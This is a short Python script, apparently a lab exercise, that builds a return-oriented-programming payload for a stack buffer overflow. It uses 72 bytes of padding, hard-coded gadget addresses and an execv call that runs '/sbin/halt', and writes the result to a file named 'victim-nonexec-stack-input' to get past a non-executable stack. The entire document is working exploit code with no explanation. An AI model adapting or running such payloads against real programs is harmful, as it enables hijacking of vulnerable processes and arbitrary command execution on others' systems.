from struct import pack
buf_base = 0x7fffffffdfb0

buf = b'\x00'*72
buf += pack("<Q", 0x7ffff7a0555f) #pop rdi; ret
buf += pack("<Q", buf_base+136) #ptr to halt
buf += pack("<Q", 0x7ffff7b146d9) #pop rdx; pop rsi; ret
buf += pack("<Q", 0x0) #rdx=NULL
buf += pack("<Q", buf_base + 120) 
buf += pack("<Q", 0x7ffff7ac8e30) #ptr to execv
buf += pack("<Q", buf_base +136) #@buf_base+120: ptr to halt
buf += pack("<Q", 0x0) #NULL ptr
buf += b"/sbin/halt\0" #@buf_base+136
with open('victim-nonexec-stack-input', 'wb') as out:
    out.write(buf)
